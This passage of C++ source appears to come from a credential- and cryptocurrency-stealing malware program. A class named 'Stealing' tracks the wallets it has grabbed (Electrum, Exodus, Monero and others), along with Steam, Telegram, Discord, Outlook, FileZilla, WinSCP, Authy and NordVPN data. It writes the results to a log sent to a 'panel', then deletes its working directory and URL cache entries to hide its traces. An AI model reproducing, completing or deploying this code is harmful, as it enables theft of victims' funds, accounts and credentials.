		grabbedInfo.GrabbedWallets.Electrum.bGrabbed,
		grabbedInfo.GrabbedWallets.MultiBit.bGrabbed,
		grabbedInfo.GrabbedWallets.Armory.bGrabbed,
		grabbedInfo.GrabbedWallets.Ethereum.bGrabbed,
		grabbedInfo.GrabbedWallets.Bytecoin.bGrabbed,
		grabbedInfo.GrabbedWallets.Jaxx.bGrabbed,
		grabbedInfo.GrabbedWallets.LibertyJaxx.bGrabbed,
		grabbedInfo.GrabbedWallets.Atomic.bGrabbed,
		grabbedInfo.GrabbedWallets.Exodus.bGrabbed,
		grabbedInfo.GrabbedWallets.DashCore.bGrabbed,
		grabbedInfo.GrabbedWallets.Bitcoin.bGrabbed,
		grabbedInfo.GrabbedWallets.Bitcoin.bGrabbed,
		grabbedInfo.GrabbedWallets.Wasabi.bGrabbed,
		grabbedInfo.GrabbedWallets.Daedalus.bGrabbed,
		grabbedInfo.GrabbedWallets.Monero.bGrabbed,
		grabbedInfo.Steam.bGrabbed,
		grabbedInfo.Telegram.bGrabbed,
		grabbedInfo.Discord.bGrabbed,
		grabbedInfo.Jabber.Pidgin.bGrabbed,
		grabbedInfo.Jabber.Psi.bGrabbed,
		grabbedInfo.Jabber.PsiPlus.bGrabbed,
		grabbedInfo.bFoxmail,
		grabbedInfo.bOutlook,
		grabbedInfo.FileZilla.bGrabbed,
		grabbedInfo.bWinScp,
		grabbedInfo.Authy.bGrabbed,
		grabbedInfo.NordVpn.bGrabbed
		);
	logInfo += temp;
	panel.AddFile(this->logInfoFile, logInfo);
}

void Stealing::CleanUp(string url)
{
	Utils::DelDirectory(this->workingPath);
	DEBUG("DelDirectory: %d", GetLastError());
	API(WININET, DeleteUrlCacheEntryA)(url.c_str());
}

bool Stealing::IsCryptoExist()
{
	Wallets wallets = this->grabbedInfo.GrabbedWallets;
	if (wallets.Electrum.bGrabbed || wallets.MultiBit.bGrabbed || wallets.Armory.bGrabbed ||
		wallets.Ethereum.bGrabbed || wallets.Bytecoin.bGrabbed || wallets.Jaxx.bGrabbed || 
		wallets.LibertyJaxx.bGrabbed || wallets.Atomic.bGrabbed || wallets.Exodus.bGrabbed ||
		wallets.DashCore.bGrabbed || wallets.Bitcoin.bGrabbed || wallets.Wasabi.bGrabbed ||
		wallets.Daedalus.bGrabbed || wallets.Monero.bGrabbed)
		return true;
	return false;
}
